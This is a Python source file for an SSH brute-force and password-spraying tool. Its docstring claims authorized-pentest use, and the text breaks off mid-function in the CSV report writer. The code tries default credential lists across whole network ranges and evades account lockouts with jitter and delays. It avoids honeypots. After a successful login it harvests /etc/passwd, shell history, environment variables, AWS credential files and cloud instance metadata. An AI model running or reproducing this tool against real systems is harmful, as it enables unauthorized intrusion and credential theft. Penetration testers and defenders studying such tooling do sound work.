#!/usr/bin/env python3

"""SSH Scanner v5 - Professional Pentest Tool
   Authorized use only. For security assessments against systems you own
   or have explicit written permission to test.
"""

import os
import sys
import re
import csv
import html
import json
import time
import socket
import signal
import threading
import datetime
import ipaddress
import argparse
import dataclasses
import concurrent.futures
from collections import deque
from dataclasses import dataclass, field
from typing import Optional

import paramiko
import prettyprint as pp

# ─── Constants ────────────────────────────────────────────────────────────────

VERSION = "5.0"
DEFAULT_PORT = 22
DEFAULT_THREADS = 10
DEFAULT_TIMEOUT = 10.0
DEFAULT_CMD_TIMEOUT = 10.0
DEFAULT_SPRAY_DELAY = 30.0
DEFAULT_JITTER_MIN = 0.5
DEFAULT_JITTER_MAX = 3.0
DEFAULT_LOCKOUT_THRESHOLD = 5
DEFAULT_LOCKOUT_BACKOFF = 60.0
DEFAULT_RESUME_FILE = "ssh_scan_state.json"
DEFAULT_JSON_OUTPUT = "ssh_findings.json"
STDERR_LINE_CAP = 200

DEFAULT_USERS = [
    "root", "admin", "administrator", "ubuntu", "ec2-user", "centos",
    "debian", "pi", "user", "test", "guest", "operator", "deploy",
    "git", "ansible", "jenkins", "www-data", "postgres", "mysql",
    "oracle", "vagrant", "hadoop", "hdfs", "spark", "kafka",
]

DEFAULT_PASSWORDS = [
    "root", "toor", "admin", "admin123", "administrator", "password",
    "password1", "Password1", "P@ssw0rd", "Passw0rd", "Passw@rd",
    "123456", "12345678", "123456789", "1234567890",
    "qwerty", "qazwsx", "letmein", "welcome", "changeme",
    "raspberry", "dietpi", "alpine", "ubuntu", "debian",
    "vagrant", "ansible", "docker", "jenkins", "test", "guest",
    "uploader", "webmaster", "webadmin", "maintenance", "techsupport",
    "logon", "default", "support", "service", "oracle", "postgres",
    "", "!",  # blank and single-char
]

# Known SSH server CVEs — banner substring → list of CVE dicts
SSH_CVE_MAP = {
    # OpenSSH critical/high CVEs worth noting
    "OpenSSH_8.4": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
    ],
    "OpenSSH_8.5": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
    ],
    "OpenSSH_8.6": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
    ],
    "OpenSSH_8.7": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
    ],
    "OpenSSH_8.8": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
    ],
    "OpenSSH_9.0": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
    ],
    "OpenSSH_9.1": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
    ],
    "OpenSSH_9.2": [
        {"cve": "CVE-2023-38408", "severity": "CRITICAL",
         "desc": "ssh-agent remote code exec via PKCS#11 provider loading"},
        {"cve": "CVE-2023-51385", "severity": "HIGH",
         "desc": "ProxyCommand OS command injection via hostname with shell metacharacters"},
    ],
    "OpenSSH_9.3": [
        {"cve": "CVE-2024-6387", "severity": "CRITICAL",
         "desc": "regreSSHion: unauthenticated RCE via race condition in signal handler (glibc Linux)"},
        {"cve": "CVE-2023-51385", "severity": "HIGH",
         "desc": "ProxyCommand OS command injection"},
    ],
    "OpenSSH_9.4": [
        {"cve": "CVE-2024-6387", "severity": "CRITICAL",
         "desc": "regreSSHion: unauthenticated RCE via race condition in signal handler (glibc Linux)"},
    ],
    "OpenSSH_9.5": [
        {"cve": "CVE-2024-6387", "severity": "CRITICAL",
         "desc": "regreSSHion: unauthenticated RCE via race condition in signal handler (glibc Linux)"},
    ],
    "OpenSSH_9.6": [
        {"cve": "CVE-2024-6387", "severity": "CRITICAL",
         "desc": "regreSSHion: unauthenticated RCE via race condition in signal handler (glibc Linux)"},
    ],
    "OpenSSH_7.": [
        {"cve": "CVE-2016-0777", "severity": "MEDIUM",
         "desc": "Roaming feature information leak via UseRoaming"},
        {"cve": "CVE-2016-0778", "severity": "HIGH",
         "desc": "Roaming feature buffer overflow"},
    ],
    "OpenSSH_6.": [
        {"cve": "CVE-2016-0777", "severity": "MEDIUM",
         "desc": "Roaming feature information leak"},
        {"cve": "CVE-2014-1692", "severity": "HIGH",
         "desc": "Memory corruption in J-PAKE key exchange"},
    ],
    "dropbear": [
        {"cve": "CVE-2023-48795", "severity": "MEDIUM",
         "desc": "Terrapin attack: SSH prefix truncation weakening transport security"},
    ],
    "SSH-1.": [
        {"cve": "CVE-2001-0361", "severity": "HIGH",
         "desc": "SSH-1 protocol multiple vulnerabilities (CRC-32 compensation attack)"},
    ],
}

HONEYPOT_SIGNATURES = [
    "kippo", "cowrie", "honeyssh", "sshesame", "honssh",
    "openssh 4.3p2",   # old version commonly used by kippo
    "honeypot",
]

# Post-exploitation command set
POST_EXPLOIT_COMMANDS = {
    "os_info":        "uname -a 2>/dev/null",
    "hostname":       "hostname 2>/dev/null",
    "current_user":   "id 2>/dev/null",
    "sudo_check":     "sudo -l 2>/dev/null",
    "passwd_file":    "cat /etc/passwd 2>/dev/null",
    "shadow_check":   "ls -la /etc/shadow 2>/dev/null",
    "network_ifaces": "ip a 2>/dev/null || ifconfig 2>/dev/null",
    "listening_ports":"ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
    "running_procs":  "ps aux --no-headers 2>/dev/null | head -30",
    "crontabs":       "cat /etc/crontab 2>/dev/null; ls /etc/cron.* 2>/dev/null",
    "env_vars":       "env 2>/dev/null",
    "ssh_keys":       "find ~/.ssh -type f 2>/dev/null",
    "history":        "cat ~/.bash_history 2>/dev/null | tail -20",
    "docker_check":   "docker ps 2>/dev/null; id | grep -i docker",
    "suid_binaries":  "find / -perm -4000 -type f 2>/dev/null | head -20",
    "cloud_metadata": "curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null",
    "aws_creds":      "cat ~/.aws/credentials 2>/dev/null",
}

# ─── Globals ──────────────────────────────────────────────────────────────────

_shutdown_event = threading.Event()
verbose = False


# ─── Data types ───────────────────────────────────────────────────────────────

@dataclass
class CVEEntry:
    cve: str
    severity: str
    description: str


@dataclass
class Credential:
    user: str
    password: str
    method: str          # "password", "keyboard-interactive", "publickey"
    key_file: Optional[str] = None


@dataclass
class HostResult:
    host: str
    port: int
    status: str          # "success", "failed", "unreachable", "skipped", "honeypot"
    banner: Optional[str] = None
    software: Optional[str] = None
    version: Optional[str] = None
    honeypot_suspected: bool = False
    honeypot_reason: Optional[str] = None
    auth_methods: list = field(default_factory=list)
    cves: list = field(default_factory=list)
    credential: Optional[Credential] = None
    post_exploit: dict = field(default_factory=dict)
    attempts: int = 0
    duration: float = 0.0
    timestamp: str = ""
    error: Optional[str] = None


# ─── Target loading ───────────────────────────────────────────────────────────

def load_targets(source: str, default_port: int) -> list:
    """Parse targets from CIDR, single host, host:port, or file/stdin.

    Returns a deduplicated list of (host, port) tuples.
    Accepts httpx/nuclei live_hosts.txt format (strips http(s)://, paths).
    """
    targets = []
    seen = set()

    def _add(host: str, port: int):
        key = (host, port)
        if key not in seen:
            seen.add(key)
            targets.append(key)

    def _parse_line(line: str):
        line = line.strip()
        if not line or line.startswith("#"):
            return
        # Strip URL scheme and path (from httpx/nuclei pipeline output)
        line = re.sub(r'^https?://', '', line)
        line = line.split('/')[0].split('?')[0]
        # Split host:port
        if line.count(':') == 1:
            host_part, port_part = line.rsplit(':', 1)
            try:
                _add(host_part, int(port_part))
                return
            except ValueError:
                pass
        # No port specified — use default
        _add(line, default_port)

    # CIDR or single IP/host
    if source != '-' and not os.path.exists(source):
        try:
            net = ipaddress.ip_network(source, strict=False)
            for ip in net.hosts():
                _add(str(ip), default_port)
            return targets
        except ValueError:
            pass
        # Single host (may include :port)
        _parse_line(source)
        return targets

    # File or stdin
    if source == '-':
        lines = sys.stdin.readlines()
    else:
        try:
            with open(source, 'r', encoding='utf-8') as f:
                lines = f.readlines()
        except OSError as e:
            pp.error("Cannot open target file: %s" % e)
            sys.exit(1)

    for line in lines:
        _parse_line(line)

    return targets


# ─── Banner grabbing & fingerprinting ─────────────────────────────────────────

def grab_banner(host: str, port: int, timeout: float) -> Optional[str]:
    """Connect via raw TCP, read the SSH identification line."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        raw = s.recv(1024)
        s.close()
        banner = raw.strip().decode('utf-8', errors='replace')
        return banner
    except Exception:
        return None


def parse_banner(banner: str) -> tuple:
    """Parse 'SSH-2.0-OpenSSH_8.4p1 Ubuntu-...' → (software, version)."""
    if not banner:
        return ("Unknown", "")
    # Typical format: SSH-<protoversion>-<software>[ <comments>]
    m = re.match(r'^SSH-[\d.]+-([^\s]+)', banner)
    if not m:
        return ("Unknown", "")
    sw_ver = m.group(1)
    # OpenSSH_8.4p1 → software=OpenSSH, version=8.4p1
    m2 = re.match(r'^([A-Za-z_\-]+)[_\-]?([\d.]+.*)', sw_ver)
    if m2:
        return (m2.group(1), m2.group(2))
    return (sw_ver, "")


def map_cves(software: str, version: str, banner: str) -> list:
    """Return matching CVEEntry list from SSH_CVE_MAP for this banner."""
    findings = []
    seen_cves = set()
    banner_lower = banner.lower() if banner else ""

    for key, cve_list in SSH_CVE_MAP.items():
        key_lower = key.lower()
        # Match against full banner string (case-insensitive)
        if key_lower in banner_lower:
            for c in cve_list:
                if c["cve"] not in seen_cves:
                    seen_cves.add(c["cve"])
                    findings.append(CVEEntry(c["cve"], c["severity"], c["desc"]))

    return findings


def detect_honeypot(banner: str, auth_methods: list, host: str, port: int) -> tuple:
    """Heuristic honeypot detection. Returns (is_honeypot, reason)."""
    if not banner:
        return (False, "")
    banner_lower = banner.lower()

    for sig in HONEYPOT_SIGNATURES:
        if sig in banner_lower:
            return (True, "Known honeypot signature in banner: '%s'" % sig)

    # SSH-1.x protocol is EOL since 2001; legitimate modern servers don't use it
    if banner_lower.startswith("ssh-1."):
        return (True, "SSH protocol version 1 — likely honeypot or very old system")

    # Cowrie default: advertises publickey only, no password
    if auth_methods and auth_methods == ["publickey"]:
        if "openssh_5." in banner_lower or "openssh_4." in banner_lower:
            return (True, "Old OpenSSH version + publickey-only auth matches Cowrie profile")

    # Anomalously long banner (real servers stay under ~100 bytes)
    if len(banner) > 300:
        return (True, "Anomalously long SSH banner (%d bytes)" % len(banner))

    return (False, "")


# ─── Auth method enumeration ──────────────────────────────────────────────────

def enum_auth_methods(host: str, port: int, timeout: float) -> list:
    """Enumerate SSH auth methods via RFC 4252 auth_none probe."""
    transport = None
    try:
        transport = paramiko.Transport((host, port))
        transport.start_client(timeout=timeout)
        try:
            transport.auth_none("root")
        except paramiko.BadAuthenticationType as e:
            return list(e.allowed_types)
        except paramiko.AuthenticationException:
            return []
    except Exception:
        return []
    finally:
        if transport:
            try:
                transport.close()
            except Exception:
                pass
    return []


# ─── Authentication workers ───────────────────────────────────────────────────

def attempt_password_auth(host: str, port: int, user: str, password: str,
                          timeout: float) -> tuple:
    """Attempt password auth. Returns (success, client_or_None, exception_or_None)."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host, port=port, username=user, password=password,
            timeout=timeout, banner_timeout=timeout,
            look_for_keys=False, allow_agent=False,
        )
        return (True, client, None)
    except paramiko.AuthenticationException as e:
        try:
            client.close()
        except Exception:
            pass
        return (False, None, e)
    except paramiko.BadHostKeyException as e:
        try:
            client.close()
        except Exception:
            pass
        return (False, None, e)
    except Exception as e:
        try:
            client.close()
        except Exception:
            pass
        return (False, None, e)


def attempt_keyboard_interactive_auth(host: str, port: int, user: str, password: str,
                                      timeout: float) -> tuple:
    """Attempt keyboard-interactive auth via low-level Transport.
    Returns (success, transport_or_None, exception_or_None).
    """
    transport = None
    try:
        transport = paramiko.Transport((host, port))
        transport.local_version = "SSH-2.0-OpenSSH_8.9p1"
        transport.start_client(timeout=timeout)

        def ki_handler(title, instructions, prompt_list):
            responses = []
            for prompt, _ in prompt_list:
                if any(kw in prompt.lower() for kw in ("password", "passphrase", "pass")):
                    responses.append(password)
                else:
                    responses.append("")
            return responses

        transport.auth_interactive(user, ki_handler)
        if transport.is_authenticated():
            return (True, transport, None)
        else:
            transport.close()
            return (False, None, None)
    except paramiko.BadAuthenticationType as e:
        if transport:
            try:
                transport.close()
            except Exception:
                pass
        return (False, None, e)
    except paramiko.AuthenticationException as e:
        if transport:
            try:
                transport.close()
            except Exception:
                pass
        return (False, None, e)
    except Exception as e:
        if transport:
            try:
                transport.close()
            except Exception:
                pass
        return (False, None, e)


def attempt_pubkey_auth(host: str, port: int, user: str, key_path: str,
                        timeout: float) -> tuple:
    """Try loading a private key file and authenticating with it.
    Tries RSA, Ed25519, ECDSA, DSS in order.
    Returns (success, client_or_None, exception_or_None).
    """
    key_classes = [
        paramiko.RSAKey,
        paramiko.Ed25519Key,
        paramiko.ECDSAKey,
        paramiko.DSSKey,
    ]
    pkey = None
    for klass in key_classes:
        try:
            pkey = klass.from_private_key_file(key_path)
            break
        except (paramiko.SSHException, OSError, ValueError):
            continue

    if pkey is None:
        return (False, None, Exception("Could not load key: %s" % key_path))

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host, port=port, username=user, pkey=pkey,
            timeout=timeout, banner_timeout=timeout,
            look_for_keys=False, allow_agent=False,
        )
        return (True, client, None)
    except paramiko.AuthenticationException as e:
        try:
            client.close()
        except Exception:
            pass
        return (False, None, e)
    except Exception as e:
        try:
            client.close()
        except Exception:
            pass
        return (False, None, e)


def attempt_all_methods(host: str, port: int, user: str, password: str,
                        config, available_methods: list) -> tuple:
    """Try all enabled auth methods in priority order.
    Returns (success, session_or_None, credential_or_None).
    """
    # Password auth
    if config.try_password and (not available_methods or "password" in available_methods):
        ok, session, exc = attempt_password_auth(host, port, user, password, config.timeout)
        if ok:
            return (True, session, Credential(user, password, "password"))
        # If the error is not auth-related (network error, etc.), propagate
        if exc and not isinstance(exc, (paramiko.AuthenticationException,
                                        paramiko.BadAuthenticationType)):
            return (False, None, None)

    # Keyboard-interactive
    if config.try_ki and (not available_methods or "keyboard-interactive" in available_methods):
        ok, session, exc = attempt_keyboard_interactive_auth(
            host, port, user, password, config.timeout)
        if ok:
            return (True, session, Credential(user, password, "keyboard-interactive"))

    # Public key auth
    if config.try_pubkeys and config.pubkey_dir:
        if not available_methods or "publickey" in available_methods:
            try:
                key_files = [
                    os.path.join(config.pubkey_dir, f)
                    for f in os.listdir(config.pubkey_dir)
                    if os.path.isfile(os.path.join(config.pubkey_dir, f))
                ]
            except OSError:
                key_files = []
            for kf in key_files:
                ok, session, _ = attempt_pubkey_auth(host, port, user, kf, config.timeout)
                if ok:
                    return (True, session, Credential(user, "", "publickey", kf))

    return (False, None, None)


# ─── Post-exploitation ────────────────────────────────────────────────────────

def run_post_exploit(session, host: str, user: str,
                     commands: dict, cmd_timeout: float) -> dict:
    """Execute enumeration commands over an open SSH session.
    session can be a paramiko.SSHClient or paramiko.Transport.
    Returns {command_name: stdout_output}. Closes session when done.
    """
    results = {}
    try:
        # Normalise: get a channel-capable object
        if isinstance(session, paramiko.Transport):
            chan = session.open_session()
            # Wrap in a helper since Transport doesn't have exec_command()
            def exec_cmd(cmd):
                ch = session.open_session()
                ch.settimeout(cmd_timeout)
                ch.exec_command(cmd)
                out = b""
                while True:
                    try:
                        chunk = ch.recv(4096)
                        if not chunk:
                            break
                        out += chunk
                    except socket.timeout:
                        break
                ch.close()
                return out.decode('utf-8', errors='replace').strip()
        else:
            def exec_cmd(cmd):
                _, stdout, _ = session.exec_command(cmd, timeout=cmd_timeout)
                return stdout.read().decode('utf-8', errors='replace').strip()

        for name, cmd in commands.items():
            if _shutdown_event.is_set():
                break
            try:
                results[name] = exec_cmd(cmd)
            except Exception as e:
                results[name] = "[error: %s]" % e

    except Exception as e:
        results["_error"] = str(e)
    finally:
        try:
            if isinstance(session, paramiko.Transport):
                session.close()
            else:
                session.close()
        except Exception:
            pass
    return results


# ─── Rate limiter and jitter ──────────────────────────────────────────────────

class RateLimiter:
    """Token-bucket rate limiter. rate=0 means unlimited."""
    def __init__(self, rate: float):
        self._rate = rate
        self._lock = threading.Lock()
        self._tokens = float(rate) if rate > 0 else 0.0
        self._last = time.monotonic()

    def acquire(self):
        if self._rate <= 0:
            return
        with self._lock:
            now = time.monotonic()
            elapsed = now - self._last
            self._last = now
            self._tokens = min(self._rate, self._tokens + elapsed * self._rate)
            if self._tokens >= 1.0:
                self._tokens -= 1.0
                return
        # Sleep to pace
        time.sleep(1.0 / self._rate)


class JitterDelay:
    def __init__(self, min_s: float, max_s: float):
        self._min = min_s
        self._max = max_s

    def sleep(self):
        import random
        if self._max > 0:
            time.sleep(random.uniform(self._min, self._max))


# ─── Lockout tracker ─────────────────────────────────────────────────────────

class LockoutTracker:
    def __init__(self, threshold: int, backoff_seconds: float):
        self._threshold = threshold
        self._backoff = backoff_seconds
        self._failures: dict = {}
        self._backoff_until: dict = {}
        self._lock = threading.Lock()

    def record_failure(self, host: str) -> bool:
        """Returns True if lockout threshold just triggered."""
        with self._lock:
            self._failures[host] = self._failures.get(host, 0) + 1
            if self._failures[host] >= self._threshold:
                self._backoff_until[host] = time.monotonic() + self._backoff
                self._failures[host] = 0
                return True
        return False

    def record_success(self, host: str):
        with self._lock:
            self._failures.pop(host, None)
            self._backoff_until.pop(host, None)

    def is_locked(self, host: str) -> bool:
        with self._lock:
            until = self._backoff_until.get(host, 0)
            return time.monotonic() < until

    def get_backoff_remaining(self, host: str) -> float:
        with self._lock:
            until = self._backoff_until.get(host, 0)
            return max(0.0, until - time.monotonic())


# ─── Stats and dashboard ──────────────────────────────────────────────────────

class ScanStats:
    def __init__(self, total_hosts: int):
        self.total_hosts = total_hosts
        self.done_hosts = 0
        self.success_hosts = 0
        self.skipped_hosts = 0
        self.total_attempts = 0
        self.start_time = time.monotonic()
        self._lock = threading.Lock()
        self._attempt_times: deque = deque(maxlen=200)
        self.recent_findings: deque = deque(maxlen=8)

    def record_attempt(self):
        with self._lock:
            self.total_attempts += 1
            self._attempt_times.append(time.monotonic())

    def record_result(self, result: HostResult):
        with self._lock:
            self.done_hosts += 1
            if result.status == "success":
                self.success_hosts += 1
                cred = result.credential
                summary = "%s:%d %s:%s [%s]" % (
                    result.host, result.port,
                    cred.user if cred else "?",
                    cred.password if cred else "?",
                    cred.method if cred else "?",
                )
                self.recent_findings.append(summary)
            elif result.status == "skipped":
                self.skipped_hosts += 1

    def attempts_per_second(self) -> float:
        with self._lock:
            if len(self._attempt_times) < 2:
                return 0.0
            window = [t for t in self._attempt_times
                      if t > time.monotonic() - 10.0]
            if len(window) < 2:
                return 0.0
            return len(window) / (window[-1] - window[0] + 0.001)

    def eta_str(self) -> str:
        elapsed = time.monotonic() - self.start_time
        done = self.done_hosts
        if done == 0:
            return "?"
        rate = done / elapsed
        remaining = max(self.total_hosts - done, 0)
        secs = remaining / rate if rate > 0 else 0
        return "%dm%02ds" % (int(secs) // 60, int(secs) % 60)


class DashboardThread(threading.Thread):
    def __init__(self, stats: ScanStats):
        super().__init__(daemon=True)
        self._stats = stats
        self._stop = threading.Event()
        self._lines = 0

    def run(self):
        if not sys.stdout.isatty():
            return
        while not self._stop.is_set():
            self._render()
            time.sleep(1.0)

    def _render(self):
        s = self._stats
        elapsed = time.monotonic() - s.start_time
        elapsed_str = "%dm%02ds" % (int(elapsed) // 60, int(elapsed) % 60)
        aps = s.attempts_per_second()

        if self._lines > 0:
            # Move cursor up to overwrite previous block
            sys.stdout.write("\033[%dA\r" % self._lines)
            sys.stdout.flush()

        lines = []
        lines.append("\033[36m╔══ SSH Scanner v%s ══════════════════════════════╗\033[0m" % VERSION)
        lines.append(" Elapsed: %-8s  ETA: %-8s  Rate: %.1f/s" % (elapsed_str, s.eta_str(), aps))
        lines.append(" Hosts:  %d/%d done  |  \033[32m%d success\033[0m  |  %d skipped" % (
            s.done_hosts, s.total_hosts, s.success_hosts, s.skipped_hosts))
        lines.append(" Attempts: %d total" % s.total_attempts)
        if s.recent_findings:
            lines.append("\033[33m Recent findings:\033[0m")
            for f in list(s.recent_findings):
                lines.append("   \033[32m✓\033[0m %s" % f[:70])
        lines.append("\033[36m╚════════════════════════════════════════════════╝\033[0m")

        for line in lines:
            sys.stdout.write(line + "\033[K\n")
        sys.stdout.flush()
        self._lines = len(lines)

    def stop(self):
        self._stop.set()
        if self._lines > 0 and sys.stdout.isatty():
            # Clear the dashboard block
            sys.stdout.write("\033[%dA\r\033[J" % self._lines)
            sys.stdout.flush()


# ─── Host scanner (core worker) ───────────────────────────────────────────────

def scan_host(host: str, port: int, userlist: list, passwordlist: list,
              config, stats: ScanStats,
              lockout: LockoutTracker, rate_limiter: RateLimiter,
              jitter: JitterDelay) -> HostResult:
    """Full scan lifecycle for a single host."""
    t_start = time.monotonic()
    ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
    result = HostResult(host=host, port=port, status="failed", timestamp=ts)

    if _shutdown_event.is_set():
        result.status = "skipped"
        return result

    # 1. Banner grab
    banner = grab_banner(host, port, config.timeout)
    if banner is None:
        result.status = "unreachable"
        result.error = "No response on %s:%d" % (host, port)
        result.duration = time.monotonic() - t_start
        stats.record_result(result)
        if verbose:
            pp.warning("[unreachable] %s:%d" % (host, port))
        return result

    if "ssh" not in banner.lower():
        result.status = "unreachable"
        result.error = "Port %d on %s does not speak SSH (banner: %s)" % (port, host, banner[:60])
        result.duration = time.monotonic() - t_start
        stats.record_result(result)
        return result

    result.banner = banner
    software, version = parse_banner(banner)
    result.software = software
    result.version = version
    result.cves = map_cves(software, version, banner)

    if verbose:
        pp.info("[banner] %s:%d — %s" % (host, port, banner))
    if result.cves:
        severities = [c.severity for c in result.cves]
        worst = "CRITICAL" if "CRITICAL" in severities else (
                "HIGH" if "HIGH" in severities else severities[0])
        pp.warning("[CVE] %s:%d — %d CVE(s) found, worst: %s" % (
            host, port, len(result.cves), worst))
        for c in result.cves:
            pp.warning("       %s [%s] %s" % (c.cve, c.severity, c.description))

    # 2. Auth method enumeration
    auth_methods = enum_auth_methods(host, port, config.timeout)
    result.auth_methods = auth_methods
    if verbose and auth_methods:
        pp.info("[auth-methods] %s:%d — %s" % (host, port, ", ".join(auth_methods)))

    # 3. Honeypot detection
    is_honeypot, reason = detect_honeypot(banner, auth_methods, host, port)
    if is_honeypot:
        result.honeypot_suspected = True
        result.honeypot_reason = reason
        pp.warning("[honeypot] %s:%d — %s" % (host, port, reason))
        if not config.scan_honeypots:
            result.status = "honeypot"
            result.duration = time.monotonic() - t_start
            stats.record_result(result)
            return result

    # 4. Credential testing
    all_credentials = []
    found = False
    for user in userlist:
        for password in passwordlist:
            if _shutdown_event.is_set():
                break
            if lockout.is_locked(host):
                remaining = lockout.get_backoff_remaining(host)
                pp.warning("[lockout] %s:%d — backing off %.0fs" % (host, port, remaining))
                time.sleep(min(remaining, 30))
                if lockout.is_locked(host):
                    break

            rate_limiter.acquire()
            if config.stealth:
                jitter.sleep()

            stats.record_attempt()
            result.attempts += 1

            ok, session, exc = attempt_all_methods(
                host, port, user, password, config, auth_methods)

            if ok:
                cred = Credential(user, password, "password")  # method set inside attempt_all_methods
                lockout.record_success(host)
                pp.status("[SUCCESS] %s:%d — %s:%s" % (host, port, user, password))

                # Run post-exploitation if enabled
                post_data = {}
                if config.post_exploit and session is not None:
                    pp.info("[post-exploit] %s:%d — enumerating..." % (host, port))
                    cmds = config.post_exploit_commands or POST_EXPLOIT_COMMANDS
                    post_data = run_post_exploit(session, host, user, cmds, config.cmd_timeout)
                    if post_data.get("current_user", ""):
                        pp.info("[post-exploit] %s:%d — user: %s" % (
                            host, port, post_data["current_user"]))
                    if post_data.get("sudo_check", "") and "NOPASSWD" in post_data.get("sudo_check", ""):
                        pp.warning("[PRIV-ESC] %s:%d — sudo NOPASSWD found!" % (host, port))
                elif session is not None:
                    try:
                        if isinstance(session, paramiko.Transport):
                            session.close()
                        else:
                            session.close()
                    except Exception:
                        pass

                result.status = "success"
                result.credential = cred
                result.post_exploit = post_data
                found = True
                break  # Stop at first success per host (configurable via --continue-after-success)
            else:
                # Classify the failure
                exc_str = str(exc) if exc else ""
                if isinstance(exc, (paramiko.BadHostKeyException,)):
                    pp.error("[HOST-KEY-MISMATCH] %s:%d — possible MITM!" % (host, port))
                    result.status = "skipped"
                    result.error = "Host key mismatch"
                    result.duration = time.monotonic() - t_start
                    stats.record_result(result)
                    return result
                elif any(kw in exc_str.lower() for kw in
                         ("connection refused", "no route", "timed out", "reset by peer")):
                    # Network failure — host is gone
                    result.status = "unreachable"
                    result.error = exc_str[:120]
                    result.duration = time.monotonic() - t_start
                    stats.record_result(result)
                    return result

                triggered = lockout.record_failure(host)
                if triggered:
                    pp.warning("[lockout-detected] %s:%d — threshold hit, pausing" % (host, port))

                if verbose:
                    pp.warning("[failed] %s:%d %s:%s" % (host, port, user, password))

        if found:
            break

    if not found and result.status == "failed":
        pp.info("[done] %s:%d — no valid credentials found (%d attempts)" % (
            host, port, result.attempts))

    result.duration = time.monotonic() - t_start
    stats.record_result(result)
    return result


# ─── Spray orchestration ──────────────────────────────────────────────────────

def run_spray_mode(targets: list, config, stats: ScanStats,
                   lockout: LockoutTracker, rate_limiter: RateLimiter,
                   jitter: JitterDelay) -> list:
    """One password at a time across all targets — avoids per-user lockouts."""
    results: dict = {}

    pp.status("Spray mode: %d passwords × %d users × %d hosts" % (
        len(config.passwordlist), len(config.userlist), len(targets)))

    for pwd_idx, password in enumerate(config.passwordlist):
        if _shutdown_event.is_set():
            break
        pp.status("Spraying password %d/%d: %s" % (
            pwd_idx + 1, len(config.passwordlist), "*" * min(len(password), 8)))

        pending = [(h, p) for (h, p) in targets
                   if results.get("%s:%d" % (h, p), {}).get("status") != "success"]

        with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as executor:
            futures = {}
            for host, port in pending:
                # For spray we submit one-password-at-a-time tasks
                class _OnePasswordConfig:
                    pass
                one_cfg = _OnePasswordConfig()
                one_cfg.__dict__.update(config.__dict__)
                one_cfg.passwordlist = [password]
                f = executor.submit(
                    scan_host, host, port, config.userlist, [password],
                    config, stats, lockout, rate_limiter, jitter)
                futures[f] = (host, port)

            for f in concurrent.futures.as_completed(futures):
                if _shutdown_event.is_set():
                    break
                result = f.result()
                key = "%s:%d" % (result.host, result.port)
                existing = results.get(key)
                if not existing or result.status == "success":
                    results[key] = result

        if pwd_idx < len(config.passwordlist) - 1:
            pp.info("Spray round complete. Waiting %.0fs before next password..." %
                    config.spray_delay)
            for _ in range(int(config.spray_delay)):
                if _shutdown_event.is_set():
                    break
                time.sleep(1)

    return list(results.values())


def run_bruteforce_mode(targets: list, config, stats: ScanStats,
                        lockout: LockoutTracker, rate_limiter: RateLimiter,
                        jitter: JitterDelay) -> list:
    """Submit one full scan_host() task per host in parallel."""
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as executor:
        futures = {
            executor.submit(
                scan_host, host, port, config.userlist, config.passwordlist,
                config, stats, lockout, rate_limiter, jitter
            ): (host, port)
            for host, port in targets
        }

        for f in concurrent.futures.as_completed(futures):
            if _shutdown_event.is_set():
                break
            results.append(f.result())

    return results


# ─── Resume state ─────────────────────────────────────────────────────────────

def save_state(results: list, config_summary: dict, start_time: str,
               resume_file: str):
    """Atomically write scan progress to disk."""
    data = {
        "version": VERSION,
        "start_time": start_time,
        "config": config_summary,
        "results": [dataclasses.asdict(r) for r in results],
    }
    tmp = resume_file + ".tmp"
    try:
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
        os.replace(tmp, resume_file)
    except OSError as e:
        pp.warning("Could not save state: %s" % e)


def load_state(resume_file: str) -> Optional[dict]:
    """Load a previous scan state. Returns None if not found/corrupt."""
    try:
        with open(resume_file, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return None


# ─── Output writers ───────────────────────────────────────────────────────────

def write_text_log(message: str, log_path: str):
    """Thread-safe append to text log via prettyprint."""
    pp.log_status(message, log_path)


def write_json_findings(results: list, output_path: str):
    """Write JSONL findings (one JSON object per line, successes + CVEs)."""
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            for r in results:
                if r.status in ("success",) or r.cves:
                    obj = dataclasses.asdict(r)
                    f.write(json.dumps(obj) + "\n")
        pp.info("JSON findings written to %s" % output_path)
    except OSError as e:
        pp.error("Could not write JSON output: %s" % e)


def write_csv_findings(results: list, output_path: str):
    """Write CSV report of successful logins."""
    fields = ["HOST", "PORT", "USER", "PASSWORD", "METHOD", "KEY_FILE",
              "BANNER", "SOFTWARE", "VERSION", "CVE_COUNT", "SEVERITY",
              "HONEYPOT", "ATTEMPTS", "DURATION_S", "TIMESTAMP"]
    try:
        with open(output_path, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fields, quoting=csv.QUOTE_ALL)
            writer.writeheader()
            for r in results:
                cred = r.credential
                worst_sev = ""
                if r.cves:
                    sevs = [c.severity for c in r.cves]
                    for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
                        if s in sevs:
                            worst_sev = s
                            break
                writer.writerow({
                    "HOST": r.host,
                    "PORT": r.port,
                    "USER": cred.user if cred else "",
                    "PASSWORD": cred.password if cred else "",
